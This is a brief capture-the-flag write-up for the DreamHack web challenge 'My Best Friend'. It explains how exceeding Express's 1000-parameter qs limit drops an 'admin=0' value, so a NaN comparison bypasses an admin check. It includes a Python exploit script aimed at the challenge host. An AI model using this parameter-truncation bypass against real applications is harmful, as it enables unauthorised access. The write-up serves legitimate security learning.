# My Best Friend — DreamHack

> **Room / Challenge:** My Best Friend (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** My Best Friend (web)
- **Link**: `https://dreamhack.io/wargame/challenges/1859`
- **Level:** `1`
- **Date:** `07-02-2026`

---

## Goal

Leveraging the limit of Express app to get the flag.

## My Solution

The `qs` library used by Express just handle 1000 query parameters, this method is created to prevent DoS attack, so we can leveraging this to make the `admin=0` isn't handled.

```javascript
const isAdmin = Number(req.query.admin); // if req.query.admin = undefined, so isAdmin = NaN

console.log("isAdmin", isAdmin);

if (isAdmin !== 0) {
  // NaN !== 0
  return res.send(FLAG);
}
```

Exploit script:

```python
import requests

url = 'http://host1.dreamhack.games:22761/greet'

payload = "&".join([f"p{i}=1" for i in range(1001)])

data = {
    "msg": payload
}

response = requests.post(url, json=data)

print(response.text)
```
